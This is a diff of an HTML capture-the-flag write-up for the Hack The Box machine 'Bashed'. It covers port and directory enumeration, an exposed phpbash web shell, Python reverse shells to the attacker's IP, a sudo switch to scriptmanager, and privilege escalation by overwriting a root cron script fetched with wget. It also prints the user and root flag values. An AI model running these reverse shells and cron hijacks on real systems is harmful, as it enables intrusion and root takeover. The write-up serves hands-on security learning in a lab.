@@ -16,13 +16,22 @@
         <li><strong>-Pn -n</strong>: Skips host discovery and DNS resolution for speed.</li>
     </ul>
 
-    <p>Only port 80 was open. Detailed service scan:</p>
+    <p>Only port 80 was open. Service scan:</p>
     <div class="terminal-box">nmap -sC -sV -p80 10.10.10.68</div>
+    <ul>
+        <li><strong>-sC</strong>: Runs default scripts.</li>
+        <li><strong>-sV</strong>: Enumerates for the version running.</li>
+    </ul>
 
-    <p>I added <code>bashed.htb</code> to my hosts file and ran Gobuster:</p>
+     <p>The domain is <code>bashed.htb</code>. I updated my <code>/etc/hosts</code>: <p></p>
+
+    <div class="terminal-box">echo "10.10.10.68 bashed.htb" | sudo tee -a /etc/hosts</div>
+
+        <p>Next step is directory enumeration:</p>
+    
     <div class="terminal-box">gobuster dir --url "http://10.10.10.68/" -w /usr/share/dirb/wordlists/small.txt</div>
     
-    <p>Discovered <code>/dev/phpbash.php</code>—a web shell. Navigated there and found the user flag.</p>
+    <p>Discovered <code>/dev/phpbash.php</code>—a web shell. We can find the user flag at the arrexel's home directory.</p>
 
     <fieldset class="cred-box">
         <legend>User Flag</legend>
@@ -39,23 +48,38 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
 s.connect(("10.10.14.17",1234)); \
 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); \
 p=subprocess.call(["/bin/sh","-i"]);'</div>
+
+    <p>I upgraded my shell</p>
+
+    <div class="terminal-box"> python -c 'import pty; pty.spawn("/bin/bash")'</div>
     
     <p>Checking sudo permissions:</p>
     <div class="terminal-box">sudo -l</div>
     <p>We can run commands as <b>scriptmanager</b> without a password. Switching users:</p>
     <div class="terminal-box">sudo -i -u scriptmanager</div>
 
-    <p>Inside <code>/scripts</code>, I found <code>test.py</code> which is executed by root. I replaced it with a root reverse shell script:</p>
+    <p>Inside <code>/scripts</code>, I found <code>test.py</code> which is executed by root.</p>
+    <p>I created a new <code>test.py</code> to my machine and replaced the old one with my new one.</p>
     <div class="terminal-box">import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("10.10.14.17",9002))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-import pty; pty.spawn("sh")</div>
+import pty; pty.spawn("sh")
+    
+## This is the new test.py with my IP</div>
 
+    <p>I opened a new listener to port 9002 and I opened a http server.</p>
+    <div class="terminal-box">python3 -m http.server 8000</div>
+    <p>From the reverse shell I downloaded the new test.py.</p>
+    <div class="terminal-box">wget http://10.10.14.17:8000/test.py -O /scripts/test.py</div>
+    <p>I have to change permissions to be accessible through everyone.</p>
+    <div class="terminal-box">chmod 777 test.py</p>
+        
     <p>After a minute, the cronjob executed the script and granted root access.</p>
 
+    <img src="/pngs/HTB/Easy/Bashed/Pasted%20image%2020250423145542.png">
     <fieldset class="root-box">
         <legend>Root Flag</legend>
         <code>318b1a2f4579d0e8161424267a74eb62</code>
